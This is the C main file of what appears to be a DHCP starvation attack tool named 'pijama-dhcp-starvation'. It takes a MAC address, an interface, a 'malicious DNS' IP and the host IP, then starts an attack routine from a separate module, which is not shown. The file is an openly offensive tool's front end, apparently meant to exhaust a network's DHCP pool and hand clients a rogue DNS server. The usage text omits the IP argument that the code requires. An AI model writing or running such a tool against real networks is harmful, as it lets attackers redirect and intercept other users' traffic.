#include <unistd.h>
#include <stdio.h>
#include "settings/constants.h"
#include "memory/memory.h"
#include "log/logger.h"
#include "network/network.h"
#include "network/network-types.h"
#include "utils/utils.h"
#include "attack/attack.h"

logger_t logger;

static void init();
static int get_arguments(int argc, char *argv[], attack_args_t *args);
static int is_listing(int argc, char *argv[]);
static void list_interfaces();
static void print_usage();
static void get_malicious_dns(char *string, ip4_t *ip);
static void get_machine_ip(char *string, ip4_t *ip);
static void get_mac_address(char *string, uint8_t mac[LENGTH_MAC_ADDRESS_AS_BYTES]);
static void get_interface_name(char *string, char name[LENGTH_INTERFACE_NAME]);

int main(int argc, char *argv[]) {
    attack_args_t args;
    char mac_string[LENGTH_MAC_ADDRESS_AS_STRING];
    char dns_string[LENGTH_IP_ADDRESS_AS_STRING];
    char ip_string[LENGTH_IP_ADDRESS_AS_STRING];
    attack_t attack_algorithm;

    init();

    if (is_listing(argc, argv)) {
        list_interfaces();
        exit(0);
    }

    if (!get_arguments(argc, argv, &args)) {
        logger_error(logger, "Wrong parameters!");
        print_usage();
        exit(-1);
    }

    mac_address_to_string(mac_string, args.mac);
    ip_to_string(dns_string, &(args.malicious_dns));
    ip_to_string(ip_string, &(args.my_ip));
    logger_info(logger, "Interface:");
    logger_info(logger, "---- name: %s", args.interface_name);
    logger_info(logger, "---- mac: %s", mac_string);
    logger_info(logger, "---- DNS: %s", dns_string);
    logger_info(logger, "---- IP: %s", ip_string);

    if (attack_create(&attack_algorithm, args) != ATTACK_E_SUCCESSFUL) {
        logger_error(logger, "Could not prepare attack");
        exit(-1);
    }

    attack_run(attack_algorithm);
    while(TRUE) {
        sleep(1);
    }

    return 0;
}

// Private methods
static int get_arguments(int argc, char *argv[], attack_args_t *args) {
    if (argc < 5) return FALSE;

    get_mac_address(argv[1], args->mac);
    get_interface_name(argv[2], args->interface_name);
    get_malicious_dns(argv[3], &(args->malicious_dns));
    get_machine_ip(argv[4], &(args->my_ip));

    return TRUE;
}

static void get_interface_name(char *string, char name[LENGTH_INTERFACE_NAME]) {
    memcpy(name, string, LENGTH_INTERFACE_NAME);
}

static void get_mac_address(char *string, uint8_t mac[6]) {
    mac_address_from_string(string, mac);
}

static void get_malicious_dns(char *string, ip4_t *ip) {
    ip_from_string(string, ip);
}

static void get_machine_ip(char *string, ip4_t *ip) {
    ip_from_string(string, ip);
}

static void print_usage() {
    logger_info(logger, "Usage:");
    logger_info(logger, "--- List interfaces: pijama-dhcp-starvation list_interfaces");
    logger_info(logger, "--- Attack: pijama-dhcp-starvation <mac_address> <interface_name> <malicious_dns>");
}

static void init() {
    memory_init();
    logger_create(&logger, "main", CONSTANT_LOG_LEVEL);
}

static int is_listing(int argc, char *argv[]) {
    return ((argc == 2) && (strcmp(argv[1], "list_interfaces") == 0));
}

static void list_interfaces() {
    network_t network;
    network_args_t args = {
        .interface_name = "Unknown",
        .on_frame_received_callback = {
            .args = NULL,
            .callback = NULL
        }
    };

    network_create(&network, args);
    logger_info(logger, "Available interfaces:");
    network_list_interfaces(network);
}